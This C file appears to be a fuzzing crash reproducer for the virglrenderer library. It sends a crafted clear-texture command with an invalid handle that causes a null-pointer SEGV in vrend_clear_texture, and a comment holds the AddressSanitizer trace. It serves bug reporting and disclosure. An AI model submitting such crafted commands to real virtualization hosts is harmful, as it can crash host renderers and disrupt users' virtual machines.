
#include <check.h>
#include <stdlib.h>
#include <stdio.h>
#include <time.h>
#include <errno.h>
#include <sys/uio.h>
#include <virglrenderer.h>
#include <virgl_context.h>
#include <vrend_renderer.h>
#include <virgl_protocol.h>
#include "vrend_winsys_egl.h"


struct fuzzer_cookie
{
   int dummy;
};

static struct fuzzer_cookie cookie;
static const uint32_t ctx_id = 1;
static struct virgl_egl *test_egl;

static void fuzzer_write_fence(UNUSED void *opaque, UNUSED uint32_t fence) {}

static virgl_renderer_gl_context
fuzzer_create_gl_context(UNUSED void *cookie, UNUSED int scanout_idx,
                         struct virgl_renderer_gl_ctx_param *param)
{
   struct virgl_gl_ctx_param vparams;
   vparams.shared = false;
   vparams.major_ver = param->major_ver;
   vparams.minor_ver = param->minor_ver;
   return virgl_egl_create_context(test_egl, &vparams);
}

static void fuzzer_destory_gl_context(UNUSED void *cookie, virgl_renderer_gl_context ctx)
{
   virgl_egl_destroy_context(test_egl, ctx);
}

static int fuzzer_make_current(UNUSED void *cookie, UNUSED int scanout_idx,
                               virgl_renderer_gl_context ctx)
{
   return virgl_egl_make_context_current(test_egl, ctx);
}


static struct virgl_renderer_callbacks fuzzer_cbs = {
   .version = 1,
   .write_fence = fuzzer_write_fence,
   .create_gl_context = fuzzer_create_gl_context,
   .destroy_gl_context = fuzzer_destory_gl_context,
   .make_current = fuzzer_make_current,
};


int main(void)
{
  test_egl = virgl_egl_init(NULL, true, true);
  int cookie = 0;
  assert(test_egl);

  virgl_renderer_init(&cookie, VIRGL_RENDERER_USE_GLES|
                      VIRGL_RENDERER_USE_SURFACELESS, &fuzzer_cbs);

  int ctx_id = 1;
  int res_id = 1;
  const char *name = "fuzzctx";
  int ret = virgl_renderer_context_create(ctx_id, strlen(name), name);

  uint32_t cmd[VIRGL_CLEAR_TEXTURE_SIZE + 1] = {0};
  int i = 0;
  cmd[i++] = VIRGL_CLEAR_TEXTURE_SIZE << 16 | VIRGL_CCMD_CLEAR_TEXTURE;
  cmd[i++] = 0x00000004;  //  handle  <<<<<  
  cmd[i++] = 0x00000000;
  cmd[i++] = 0x00000000;
  cmd[i++] = 0x00000000;
  cmd[i++] = 0x00000000;
  cmd[i++] = 0x00000000;
  cmd[i++] = 0x00000000;
  cmd[i++] = 0x00000000;
  cmd[i++] = 0x00000000;
  cmd[i++] = 0x00000000;
  cmd[i++] = 0x00000000;
  cmd[i++] = 0x00000000;

  virgl_renderer_submit_cmd((void *) cmd, ctx_id, VIRGL_CLEAR_TEXTURE_SIZE + 1);

  return 1;
}

/*
AddressSanitizer:DEADLYSIGNAL
=================================================================
==135004==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000014 (pc 0x0000004e998b bp 0x7fff76493e70 sp 0x7fff76493e30 T0)
==135004==The signal is caused by a READ memory access.
==135004==Hint: address points to the zero page.
    #0 0x4e998b in vrend_clear_texture /home/fuzzing/Desktop/virglrenderer-master/build/../src/vrend_renderer.c:4055:39
    #1 0x4d7f7f in vrend_decode_clear_texture /home/fuzzing/Desktop/virglrenderer-master/build/../src/vrend_decode.c:232:4
    #2 0x4cfcdd in vrend_decode_ctx_submit_cmd /home/fuzzing/Desktop/virglrenderer-master/build/../src/vrend_decode.c:1706:13
    #3 0x4c9561 in main /home/fuzzing/Desktop/virglrenderer-master/build/../src/crash_vrend_decode_clear_texture.c:90:3
    #4 0x7f8dc7f220b2 in __libc_start_main /build/glibc-eX1tMB/glibc-2.31/csu/../csu/libc-start.c:308:16
    #5 0x4215ad in _start (/home/fuzzing/Desktop/virglrenderer-master/build/src/crash_vrend_decode_clear_texture+0x4215ad)

AddressSanitizer can not provide additional info.
SUMMARY: AddressSanitizer: SEGV /home/fuzzing/Desktop/virglrenderer-master/build/../src/vrend_renderer.c:4055:39 in vrend_clear_texture
==135004==ABORTING
*/
